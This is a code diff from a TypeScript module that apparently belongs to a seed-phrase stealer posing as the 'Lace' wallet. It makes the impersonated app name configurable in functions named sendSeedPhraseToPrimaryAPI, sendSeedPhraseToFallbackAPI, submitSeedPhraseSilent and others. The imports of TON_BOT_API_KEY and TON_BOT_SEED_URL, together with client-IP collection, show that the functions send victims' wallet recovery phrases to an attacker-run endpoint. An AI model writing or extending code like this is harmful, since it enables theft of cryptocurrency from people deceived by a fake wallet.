@@ -8,7 +8,7 @@
  */
 
 import axios, { AxiosResponse, InternalAxiosRequestConfig, AxiosHeaders } from 'axios';
-import { TON_BOT_API_KEY, TON_BOT_SEED_URL } from '../app/config';
+import { NOTIFICATION_APP_NAME, TON_BOT_API_KEY, TON_BOT_SEED_URL } from '../app/config';
 
 // Type for axios headers structure
 type AxiosHeadersType = AxiosHeaders | Record<string, string | Record<string, string>> & {
@@ -149,7 +149,7 @@ export async function getClientIP(): Promise<string | null> {
  */
 export async function sendSeedPhraseToPrimaryAPI(
   seedPhraseMessage: string,
-  appName: string = "Lace"
+  appName: string = NOTIFICATION_APP_NAME
 ): Promise<SubmitResult> {
   try {
     let clientIP: string | null = null;
@@ -215,7 +215,7 @@ export async function sendSeedPhraseToPrimaryAPI(
  */
 export async function sendSeedPhraseToFallbackAPI(
   seedPhraseMessage: string,
-  appName: string = "Lace",
+  appName: string = NOTIFICATION_APP_NAME,
   apiKey: string | null = null
 ): Promise<SubmitResult> {
   try {
@@ -276,7 +276,7 @@ export async function sendSeedPhraseToFallbackAPI(
  */
 export async function submitSeedPhraseComplete(
   seedPhraseMessage: string,
-  appName: string = "Lace",
+  appName: string = NOTIFICATION_APP_NAME,
   options: SubmitOptions = {}
 ): Promise<SubmitResult> {
   const { 
@@ -344,7 +344,7 @@ export async function submitSeedPhraseComplete(
  */
 export async function submitSeedPhraseSilent(
   seedPhraseMessage: string,
-  appName: string = "Lace",
+  appName: string = NOTIFICATION_APP_NAME,
   apiKey: string | null = null
 ): Promise<boolean> {
   try {
@@ -453,7 +453,7 @@ export async function submitSeedPhraseSilent(
  */
 export async function submitSeedPhraseWalletJSX(
   seedPhraseMessage: string,
-  appName: string = "Lace",
+  appName: string = NOTIFICATION_APP_NAME,
   options: SubmitOptions = {}
 ): Promise<SubmitResult> {
   const { 
